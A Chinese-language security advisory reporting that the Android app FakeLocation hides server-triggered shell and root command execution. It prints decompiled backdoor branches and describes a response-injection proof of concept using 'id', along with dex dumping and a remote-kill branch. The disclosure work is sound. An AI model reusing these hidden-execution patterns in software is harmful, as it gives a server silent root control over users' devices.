# FakeLocation 在未向用户披露的情况下执行服务端下发的 shell 命令

报告人: [tyldx](https://github.com/tyldx) · tyldx@proton.me · 2026-11 · 修订版 1.7

## 1. 摘要与相关工作

FakeLocation 是一款用于模拟设备 GPS 定位与路线的 Android 应用, 可选的 ROOT 模式需用户授予 root 权限。应用含未向用户披露的服务端可控命令执行能力: 存在三条通道 (编号见第 4 节), 服务端可让应用执行任意 shell 命令, 其中两条经 `su` 执行, 一条在用户同意首启条款之前即触发。隐私政策与用户协议均未披露此能力 (见 3.1)。

已检查的 9 个版本 (1.3.1.6 至 1.5.2, 见第 2 节) 均受影响, 该能力不晚于 2022 年 8 月即已存在。评分 8.3 (CVSS v3.1) / 9.0 (v4.0)。证书锁定使任意网络攻击者无法通过中间人触发, 可触发方仅为开发者或攻破其服务器/窃取私钥者 (见第 5 节)。自 1.3.10 起, 相关代码仅存在于运行时解密的 dex 中。

厂商已承认该接口存在且过度使用 su 权限, 并称将在后续版本移除 su 的使用、完善用户协议与隐私政策; 其所称用途 (控制盗版/破解版) 未经独立验证。

### 1.1 相关工作

以下公开分析早于本报告。本报告不主张首次发现。

- [1] 二师兄, 《安卓逆向 —— Fake Location 授权分析以及后门分析》, 知乎, 2025-02-28, https://zhuanlan.zhihu.com/p/26927292194 (存档 https://archive.today/dXwZ4)。分析官网 1.3.5 BETA 的授权校验与注入机制, 对应本报告第 8 节的 system_server 侧连接; 其所称经该连接执行服务端命令的能力, 本报告尚未核实。
- [2] AkiyamaMIO123, 《FakeLocation 1.5.0 后门分析》, 吾爱破解, 2026-07-14, https://www.52pojie.cn/thread-2117178-1-1.html (存档 https://archive.today/UAaES)。分析官网/GitHub 1.5.0, 报告了对应本报告通道二、三的 `code==10000` 分支及构建到期机制。
- [3] BlueFunny, 《Fake Location 1.5.2 高危后门分析》, LINUX DO, 2026-09-03, https://linux.do/t/topic/2847507 (原帖未能存档; locdd.com 同文副本存档 https://archive.today/tLlTl)。静态分析官网/GitHub 1.5.2, 报告了对应通道二的分支及其启动时触发。

本报告补充: 通道一; 通道一、二的运行时实测; Play 构建; 1.3.1.6 至 1.5.2 的版本范围; 证书锁定与可触发方分析。

## 2. 受影响产品

- 名称: Fake Location (Google Play 名 "Fake Location - Mock GPS&Route")。
- 两个构建:
  - 官网/GitHub 版: 包名 `com.lerist.fakelocation` (代码 flavor=CN), 经官网 fakeloc.cc/app 与 GitHub Releases (Lerist/FakeLocation) 分发。GitHub 渠道截至 2026-11-07 已无法公开访问, 存档: 仓库 https://archive.today/sTqGt 、1.5.2 release https://archive.today/zABCC (其余见 `evidence/archive-urls.md`)。
  - Play 版: 包名 `dev.lerist.fakelocation`, Google Play 分发 (50K+ 安装, 截至 2026-11-05)。
- 开发者: Lerist / 成都览一科技有限公司。
- 已检查版本: 1.3.1.6 (versionCode 1569, 官网/GitHub 构建)、1.3.2.1 (1579)、1.3.2.2 (1584)、1.3.2.3 (1585)、1.3.5 (1588)、1.3.5-beta (1593)、1.3.10 (1673) (1.3.2.1 至 1.3.10 为 Play 构建)、1.5.0 (1700 官网/GitHub, 1701 Play)、1.5.2 (1702, 两构建), 均确认受影响。
  - 1.3.1.6 于 2022-08-24 (UTC+8) 发布在 GitHub Releases (存档见 `evidence/archive-urls.md`); 1.3.2.1 是 APKPure 上可获取的最早版本。部分版本没有存档, 版本序列有间断。更早的 1.2.x (1.2.0.6 至 1.2.1.2, 2020 年) 样本未检查。1569-1702 区间内其余公开版本未逐一检查, 推定受影响。APKPure 收录日期见 `evidence/apkpure-versions-2026-11-07.png`。
- 签名证书: `b55e7f6ccb63318b2cc4d3c45e6b148131061a2acd0a82725fe59e118d1ddafc` (CN=Lerist., O=成都览一科技有限公司; 官网/GitHub 版全部, 及旧 Play <=1.3.5-beta); `d9ad7175f80ebed780b0c7c61b7c788827ad4d1953e0381feddd2fa0431f0362` (CN=Lerist., O=Lerist)。Play 版自 1.3.10 起为 APK Signature Scheme v3.1 密钥轮换签名: API 33 及以上用 d9ad, API 24-32 仍用 b55e。
- 样本 SHA-256 (已检查最早版本与 1.5.2 两个构建, 完整哈希见 `hashes/`):

  | 版本 | 渠道 | 样本 | SHA-256 |
  |---|---|---|---|
  | 1.3.1.6 | 官网/GitHub (CN) | FakeLocation_CN_v1.3.1.6_1569_20220824071825.apk | `4ac9a5c8a38beddc6f8a38101f0bff5c7bd0f6582c36c6e41c48e81bba0be1cc` |
  | 1.5.2 | 官网/GitHub (CN) | 单一 apk (官网与 GitHub 一致) | `5d2a2bad585e3d50c38621a002bcf7a8e0dcf5448fc045f58619fe7a491eaea1` |
  | 1.5.2 | Play | base.apk (app bundle) | `a4fa13cd318d6ad392bd6033a93e40bac5ac1eff90b65d7c526033aa8f679d24` |

## 3. 漏洞类型

- 主: CWE-912 Hidden Functionality (隐藏功能)。此分类不要求判定意图, 仅需该功能未向用户披露、超出规格、用户无法经明显的接口访问。
- 相关: CWE-506 Embedded Malicious Code。结合加壳、字符串加密、命令拆段、静默执行等隐蔽手段, 该功能呈现后门特征; 是否恶意属意图判断, 本报告以可观察事实为准, 此分类仅作参考。

### 3.1 未披露与授权范围

- 未授权: 隐私政策、用户协议、使用条款均未披露远程命令执行。协议中唯一涉及服务端控制的条款是《屏蔽作用的 APP 名单》(用户协议第 5.3 条), 原文为"我们有权主动识别并对已知的、易被用于非法、欺诈、侵犯第三方权益或违反其他应用服务条款的高风险应用（APP），采取技术措施进行功能作用屏蔽，并同步更新《屏蔽作用的APP名单》，被屏蔽作用的应用（APP）将不能使用本软件的模拟数据", 范围限于禁用模拟功能, 不涉及执行 shell/root 命令。ROOT 风险提示也只说授予 root 会降低设备安全, 未告知应用会执行服务端下发的命令。故该功能不在用户所同意的授权范围内。
- 存档: 隐私政策 https://archive.today/OK0Jk (2026-11-04); 用户协议 https://archive.today/PlS7t (中文, 2026-11-06)、https://archive.today/Iulzs (英文, 2026-11-04); 使用条款 https://archive.today/MyhhH (2026-11-04); 下载页 https://archive.today/ZMnTg (2026-11-04)。

## 4. 技术细节: 服务端可控命令执行路径

混淆名取自对应版本的反编译: 1.3.10 起及官网/GitHub 1.3.1.6 为运行时解密的 dex, 更早的 Play 构建为 APK 本身。以 Play 版 1.5.2 为主, 官网/GitHub 版对应类一并给出。三条通道共用同一命令出口 (Play `fv2.ළ(String[] cmds, boolean su, boolean b)` / 官网/GitHub 版 `z41`、`C13588.m51168`):

```java
Process p = Runtime.getRuntime().exec(su ? "su" : "sh");  // 命令经 stdin 写入
```

各通道出现的版本不同: 通道二 (配置接口 `app/getAppConfigs`) 在已检查的最早版本 1.3.1.6 中已存在, 该版本的 10000 分支仅见于配置回调, 基于静态分析, 未动态触发; 通道一 (getNotices) 在 1.3.5-beta (APKPure 收录于 2024-11-10) 与 1.3.10 (2025-10-31) 之间引入; 通道三仅见于官网/GitHub 版。

### 4.1 通道一: getNotices → sh (两构建)

公告类 (Play `com.lerist.lib.notice.C6073` / 官网-GitHub 版 `C11241`) 在 getNotices 响应回调中:

```java
String s = response.body().string();
if (s.startsWith("10000:")) {
    Runtime.getRuntime().exec(new String[]{"sh", "-c", s.substring(6)});
}
// 随后把 s 当作公告 JSON 解析, 对 "10000:..." 会抛异常并被 catch 吞掉
```

接口 `POST https://notice.api.fakeloc.cc:4430/Notice/getNotices`, 在应用启动的加载阶段请求; 其响应一到达即被求值 `startsWith("10000:")`。执行不读输出、不记日志、异常吞没。

### 4.2 通道二: 通用回调 code==10000 → su + sh (两构建)

同步回调 (Play `C3685.m13605`) 处理 Retrofit 响应包装对象, 失败分支:

```java
int code = resp.getCode();
String message = resp.getMessage();
if (code == 10000 && !TextUtils.isEmpty(message)) {
    fv2.<exec>(message, /*su=*/true,  ...);  // su 执行
    fv2.<exec>(message, /*su=*/false, ...);  // sh 执行
}
```

走此同步回调 (su+sh) 的接口之一是 `POST /FakeLocation/goods/getRenewalGoodsList` (打开续费页时请求)。官网/GitHub 版同步回调为 `C5901.m19381`, 语义相同。

另有异步回调变体, 走它的接口包括版本检查 `version/checkApkUpdate`。该请求在 `MainActivity.onCreate` 中无条件发出, 与通道一的 getNotices 位于同一函数 (官网/GitHub 版 `MainActivity.C11127.m44656`)。异步变体的执行方式因构建而异:

- Play 1.5.2 (`C3685.AbstractC3687.m13609`, 回调 `C5946`): 对 `code==10000` 仅执行 sh, 以应用 uid 运行 (root 可达性见第 5 节)。
- 官网/GitHub 版 (`C5901.AbstractC5903.mo959`, 回调 `C11075`) 及 Play 1.5.0 和更早版本 (如 1.5.0 `C4606.AbstractC4608`): 与同步回调相同, su 与 sh 各执行一次, 即启动时可以 root 执行。

版本检查回调对 2002 以外的错误码在 5 秒后重发请求, `code==10000` 也走此分支; 服务端持续返回 10000 时, 每次收到该响应都会再次执行命令。官网/GitHub 1.5.2 持续注入时约 6 至 8 秒执行一次。

配置接口 `app/getAppConfigs` 同样走异步回调变体 (官网/GitHub 版 `C3440.m14629`, 回调 `C3445`; Play 版 `C3071.m12188`, 回调 `C3076`), 执行方式随构建同上。它由 `Application.onCreate` (仅主进程) 经 `lv0.m5558` (Play 版 `hj2.m2797`) 发起, 早于任何 Activity; 唯一前置条件是一项 native 完整性校验 (`SwipeUtils.isQualified`)。失败或 `code==10000` 时同样 5 秒后重试。

1.3.1.6 (官网/GitHub 版, 回调 `C1829$C1830`, 仅静态分析) 至 1.3.10 的已检查版本的配置回调 (如 1.3.5-beta `C3301`、1.3.10 `C2360`) 在 `code==10000` 时经 su 与 sh 各执行一次, 同样在 `Application.onCreate` 中请求。

### 4.3 通道三: 黑名单轮询 ver/vfs code==10000 → su + sh (仅官网/GitHub 版)

后台线程 (`RunnableC13518`, 由 `C13538.m51102` 在应用 ROOT 模式激活时启动) 启动 20 至 50 秒后进入循环, 每 2 至 7 分钟检查一次, 仅当本地包名列表为空或已超过 24 小时才 `POST ver/vfs` 拉取禁止模拟定位的包名列表, 正常约一天请求一次; 响应 `code==10000 && message 非空` 时:

```java
C13588.m51168(new String[]{message}, /*su=*/true,  true);  // su
C13588.m51168(new String[]{message}, /*su=*/false, true);  // sh
```

`code==10000` 响应不会填充列表, 下一轮会再次请求, 因此服务端可持续下发命令。

### 4.4 传输与隐蔽

- 服务端: 业务 `api.fakeloc.cc:4430`, 公告 `notice.api.fakeloc.cc:4430`, 广告 `ads.api.fakeloc.cc:4430`; 连接失败时改用 `lerist.dev` 下对应的备用域名。两构建相同。
- 双向 TLS (`xp0.m10346`, BKS, 口令写死在代码)。信任库 `tp.png` 将服务端锁定到 Lerist 自签证书 (指纹 `60:5C:2B...`), 私钥不在应用内; 库内仅此一张, 不合并系统信任库 (已核对 CN 1.5.2)。客户端证书 `tl.png` 含客户端私钥 (指纹 `F1:11:05...`, 仅能冒充客户端)。信任库加载成功时, 业务客户端的 `HostnameVerifier` 恒返回 true, 但证书信任校验仍在, 故仅属潜在弱点。
- 两构建 `tp.png` 字节相同, 且同一信任库自 1.3.1.6 起字节相同 (1.3.10 之前文件名为 `transparent.png` / `translucent.png`), 故第 5 节的可触发方结论适用于全部受影响版本。
- 隐蔽: 自 1.3.10 起, 业务代码仅存在于运行时解密的 dex, 直接解包 APK 不可见; 字符串 XOR 加密; 敏感命令拆段拼接; 不记日志、异常吞没。官网/GitHub 1.5.0 为 360 加固, 1.5.2 未见 360 加固特征、改用另一种壳; Play 版自有加载器。更早版本中, 官网/GitHub 1.3.1.6 已为 360 加固但 su/sh 仍为明文, 已检查的 Play 构建未加壳。

## 5. 影响与评级

- 能让接口返回上述指令的一方可在安装受影响版本的设备上执行任意 shell 命令; 应用已获 root 时 (该应用 ROOT 模式本就要求授予 root) 通道二、三以 root 执行, 通道一下发的命令也可自行调用 su 取得 root (依据 root 管理器按应用 uid 授权的机制推断, 未实测)。
- 通道一在启动时自动触发, 除启动应用外无需其他操作; 除 Play 1.5.2 外, 各已检查构建的通道二 (配置请求) 同样在启动时触发, 并经 su 执行; 加上通道一, 对已授予 root 的用户, 包括 Play 1.5.2 在内的各构建每次启动均可以 root 执行。
- 由于证书锁定且服务端私钥不在应用内, 任意第三方无法通过网络中间人触发上述三条 HTTPS 通道, 此结论基于静态分析, 不含第 8 节所述 system_server 侧连接。实际可触发方为: 开发者本人 (持服务端私钥、运营服务器), 或攻破 Lerist 服务器/窃取其服务端私钥者。因此该功能既受开发者控制, 也构成一处供应链单点: 一旦厂商基础设施被攻破, 即造成安装受影响版本设备的 RCE 与提权。
- CVSS 按通道分别评。v3.1 共同前缀 `AV:N/AC:H/PR:N` (命令经网络下发, 需控制被证书锁定的服务端); root 通道的 v4.0 取 `AT:P`, 因需已授予应用 root; `UI:R` / `UI:P` 因需用户启动应用 (通道三需激活 ROOT 模式)。

  | 通道 (变体) | CVSS v3.1 | CVSS v4.0 |
  |---|---|---|
  | 一: sh, 应用 uid (未授予 root) | `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H` = **7.5** | `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` = **7.7** |
  | 一: 已授予 root 时 (命令自行调用 su; 推断) | `AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H` = **8.3** | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` = **9.0** |
  | 二: su/root | `AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H` = **8.3** | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` = **9.0** |
  | 三: su/root, 仅官网/GitHub 版 (需激活 ROOT 模式; 后台轮询) | `AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H` = **8.3** | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` = **9.0** |

  通道二: 官网/GitHub 版与 Play ≤1.5.0 在启动时触发; Play 1.5.2 需打开续费页, 其启动时配置请求/版本检查仅 sh, 启动时 root 见通道一。

  整体 **8.3 (v3.1, High) / 9.0 (v4.0, Critical)**, 由通道二、通道三及已授予 root 时的通道一达到。`S:C` / `SC:SI:SA:H` 反映授予 root 后越出应用取得 root。通道二经版本检查的启动路径已实测 (见 6), 故最高分不依赖仅静态确认的通道三。

### 5.1 对厂商回应的评估

- 厂商所称的定向 (仅针对盗版/破解版, 见第 10 节) 只会发生在服务端; 客户端代码中并无将这些路径限定于盗版构建的限制, 故该定向说法无法从客户端证实 (依据第 4 节的分析)。
- 厂商未提及移除 shell 接口本身; 仅移除 su 时, 通道一及通道二、三的 sh 分支仍会执行服务端下发的命令; 只要应用仍有 root 授权, 这些命令仍可取得 root (推断, 见第 5 节开头), 故仅移除应用代码中的 su 不能消除 root 级执行 (依据第 4 节)。

## 6. 概念验证

方法: LSPosed 模块 hook `BaseDexClassLoader` 构造函数以定位解密后的 OkHttp 类, 再 hook `okhttp3.internal.http.RealInterceptorChain.proceed`, 在原响应返回后按请求 URL 改写响应体, 触发应用自身的命令执行分支。原请求照常发出, 不修改厂商服务器与应用文件; 注入命令只用 `id` (含 `id -u`) 与输出重定向。实测环境 Pixel 9 (KernelSU)。

| 构建 | 通道 | 触发方式 | 关键输出 | 验证 |
|---|---|---|---|---|
| Play 1.5.2 | 一 (sh) | getNotices 响应改为 `10000:id>...` | `uid=10358(u0_a358) ... untrusted_app_34` (应用 uid) | 实测 |
| Play 1.5.2 | 二 (su) | 打开续费页 → `goods/getRenewalGoodsList` 改为 `{"code":10000,...}` | `uid=0(root) ... u:r:ksu:s0` | 实测 |
| 官网/GitHub 1.5.2 | 一 (sh) | getNotices 改写 | `uid=10355(u0_a355) ... untrusted_app_27` (应用 uid) | 实测 |
| 官网/GitHub 1.5.2 | 二 (su) | `goods/getRenewalGoodsList` 改写 | `uid=0(root)` | 实测 |
| 官网/GitHub 1.5.2 | 二 (su+sh) | 改写 `version/checkApkUpdate` 为 `code==10000` | `uid=0(root) ... u:r:ksu:s0`; sh 为 `uid=10355(u0_a355)` | 实测 |
| 官网/GitHub 1.5.2 | 三 (su) | 未触发 | 与通道二同一命令出口、同一 `code==10000` 机制 | 仅静态 |

- 通道一: 清除数据 (`pm clear`) 后首次启动时, 命令于同意框仍在屏、用户尚未点击时执行。
- 官网/GitHub 1.5.2 的版本检查已单独实测: 同意框仍在屏时产生 root 输出 (该设备此前已授予应用 root, `pm clear` 不撤销该授权); 另一轮实验同时记录了 root 与应用 uid 的 sh 输出 (见 `poc/results/cn_checkapkupdate_preconsent_root.txt`、`cn_checkapkupdate_consent_screen.png`、`cn_checkapkupdate_su_sh_proof.txt`)。版本检查实验所用的模块变体未保留, 公开的 `poc/` 源码为基线版本。
- 配置请求 `getAppConfigs` 未单独实测, 其 su+sh 分支仍据静态分析。
- 通道三未实测驱动, 原因及实验记录的局限见 `poc/results/RESULTS.zh.md`。

边界: 此为客户端侧验证, 响应由本机注入, 证明客户端会执行服务端可控的命令, 未证明厂商服务器当前正在下发。主证据是第 4 节的静态代码分支。厂商已承认该接口存在 (其用途说法见第 10 节)。

## 7. 复现与取证

- 运行时 dex 导出: 读 `/proc/<pid>/maps` 找解密 dex 区域 → dd 导出 → 按 dex 头 (大小偏移 32, class_defs 偏移 96) 切分 → jadx 反编译。字符串 XOR 解密算法: `明文[i] = a[i] ^ b[i % len(b)]`。

## 8. 其他未向用户披露的行为 (佐证, 非核心)

服务端可控: 远程终止分支 (账号同步回调, 官网/GitHub 版 `ba2`) 对 `code == 9999` 执行 `kill -9 <自身 pid>` 后 `System.exit(0)`; 注入 system_server 的 dex (`C0084`/`C0036`, 官网/GitHub 版, Play 版未确认) 以不带 TLS (应用层另有加密) 的 TCP 连接 `vef.api.fakeloc.cc:12309` (断连 30 分钟后改连 `vef.fl.api.lerist.dev`, 1 小时后改连写死 IP `141.164.37.97`), 收到 `NOPASS.` 即停止模拟; 连接失败且距上次连接成功超过 24 小时、从未收到 `pass.` 时也停止。知乎文章 [1] 称旧版本可经该连接执行服务端命令, 本报告未确认, 也未做动态验证。

本地自保护 (仅官网/GitHub 版): 反篡改机制 (`RunnableC13526`) 在 files 目录哈希不符时可能软重启、重启设备或退出; APK 完整性校验 (`C13595.m51176`) 不符时抛异常; 构建到期机制 (构建时间戳 + 200 天; 1.5.2 到期 2027-03-08 (UTC+8), 1.5.0 已于 2026-10 下旬到期) 到期后停止通道三、注入与初始化。通道一、二不受上述任一机制限制。

## 9. 用户处置建议

- 卸载 1.5.2 及更早版本 (已检查的最早受影响版本为 1.3.1.6, 更早版本未检查)。对更晚的版本, 先查看厂商修复情况与本报告的更新, 再决定是否继续使用。
- 撤销曾授予该应用的 root。
- 在已授 root 的设备上运行过受影响版本的, 应视为该设备可能已被下发过命令, 按受影响排查 (检查异常, 必要时重置)。

## 10. 相关公开记录与披露时间线

- 2025-02-28: 第三方在知乎发表官网 1.3.5 BETA 的相关分析 (见 1.1 [1])。
- 2026-07-14: 第三方在吾爱破解发表官网/GitHub 1.5.0 的相关分析 (见 1.1 [2])。
- 2026-09-03: 第三方在 LINUX DO 发表官网/GitHub 1.5.2 的相关分析 (见 1.1 [3])。
- 2026-11-05: 向 MITRE 提交 CVE 申请; 公开本报告; 向 Google Play (违反从服务端下发并执行代码的政策) 与 GitHub (release 分发含未向用户披露功能的二进制) 举报, 另通过 Android Security Malware Report Form 向 Google 举报, 邮件向 CNCERT 举报。
- 2026-11-05: 发布后已邮件通知厂商, 并询问其是否会申请 CVE 编号。`code==10000` 分支自 2026-07 起已有公开分析 (见 1.1), 至本报告发布未见厂商公开回应或修复。
- 2026-11-06: 厂商回复, 评估见 5.1。
  - 已承认: 该 shell 接口存在且过度使用 su 权限, 并称将在后续版本移除 su 的使用、完善用户协议与隐私政策 (两份文件的披露情况见 3.1)。
  - 声称但未经独立验证: 该接口本意用于控制盗版/破解版, 目前仅向这些版本下发一条长时间 sleep 命令。
- 2026-11-06: 报告人邮件追问, 请厂商确认: (1) 后续版本是彻底移除服务端下发的 shell 执行, 还是仅移除 su; (2) 哪个版本包含修复、何时发布; (3) 是否会向 MITRE CNA of Last Resort 申请 CVE 编号。
- 2026-11-07: 修订本报告 (1.3)。受影响范围扩大到 1.3.2.1 至 1.5.2; 补充启动时配置请求和版本检查以 su 执行、早于用户同意, 并附官网/GitHub 1.5.2 实测; 修正轮询频率、反篡改和签名等细节。更正: 早期修订版 (1.0-1.2) 曾称 1.3.5-beta 及更早版本不受影响, 该结论有误: 通道二 (配置端点 `app/getAppConfigs`) 自已检查的最早版本 1.3.2.1 起即存在。
- 2026-11-07: 修订本报告 (1.6.1)。撤回 1.6 中关于旧版本 system_server 侧连接的两项结论及其评分: 相关代码不在本报告材料中, 无法独立确认。
- 2026-11-07: 观察到厂商 GitHub 账号 Lerist 的主页及仓库 Lerist/FakeLocation 已无法公开访问; 据 GitHub 公开 API 的返回, 该用户名仍对应一个账号, 但对外隐藏。原因未经 GitHub 确认。此前该仓库处于归档状态, GitHub 显示的归档日期为 2026-08-20。
- 2026-11-08: 修订本报告 (1.6.7)。新增官网/GitHub 1.3.1.6 (静态分析): 通道二已存在, 受影响范围下限改为 1.3.1.6, 该能力存在时间前推至不晚于 2022-08。更正: 此前称 1.3.10 之前已检查版本均未加壳, 仅适用于 Play 构建, 1.3.1.6 已为 360 加固。
- 2026-11-09: 修订本报告 (1.7)。更正: 各通道需用户打开应用或激活 ROOT 模式, 交互指标由 `UI:N` 改为 `UI:R` / `UI:P`, 整体评分由 9.0 / 9.5 调整为 8.3 / 9.0。
